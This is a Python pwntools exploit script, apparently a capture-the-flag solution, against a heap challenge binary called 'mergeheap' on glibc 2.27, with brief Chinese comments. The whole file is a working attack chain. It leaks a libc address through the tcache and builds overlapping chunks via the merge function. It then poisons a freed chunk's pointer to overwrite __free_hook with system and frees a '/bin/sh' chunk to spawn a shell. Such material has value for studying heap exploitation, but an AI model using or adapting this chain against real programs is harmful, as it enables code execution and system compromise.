# -*- coding: utf-8 -*-
from PwnContext.core import *
binary = './mergeheap'
debug_libc = './libc-2.27.so'
elf = ELF(binary)
libc = ELF(debug_libc)
local = 0

if local == 1 :
    p = remote('','')
else:
    ctx.binary = binary
    ctx.remote_libc = debug_libc
    ctx.debug_remote_libc = True
    p = ctx.start()

def add(leng,content):
    p.sendline('1')
    p.sendline(str(leng))
    if len(content) != leng:
        p.sendline(content)
    else:
        p.send(content)

def show(idx):
    p.sendline('2')
    p.sendline(str(idx))

def delete(idx):
    p.sendline('3')
    p.sendline(str(idx))

def merge(idx1, idx2):
    p.sendline('4')
    p.sendline(str(idx1))
    p.sendline(str(idx2))

def exp():
    for i in range(8):
        add(0x100,'CCCCCCCC')
    for j in range(8):
        delete(7-j)
    add(0x1,'A')
    show(0)
    addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))  #
    libc_base = addr - 0x3ebd41
    log.success('libc_base:'+ hex(libc_base))
    free_hook = libc_base + libc.symbols['__free_hook']
    system_addr = libc_base + libc.symbols['system']
    add(0xe0, '1')  # 1
    add(0x10, '2' * 0x10)  # 2
    add(0x18, '3' * 0x18)  # 3
    add(0x80, '4' * 0x80)  # 4
    add(0x28, '5' * 0x20)  # 5  使size=31即可
    add(0x20, '6' * 0x20)  # 6

    delete(5)
    merge(2, 3)  #占用5 覆盖6的size
    add(0x20, '7' * 0x20)  #7
    delete(7) #先free掉7之后，再去改它的fd指针
    delete(6)  # 构造overlap chunk
    payload = 'a' * 0x20 + p64(0) + p64(0x31) + p64(free_hook)
    add(0x80, payload)  # 6
    add(0x20, '/bin/sh\x00')  # 7
    add(0x20, p64(system_addr))  #8
    delete(7)

if __name__ == '__main__':
    exp()
    p.interactive()

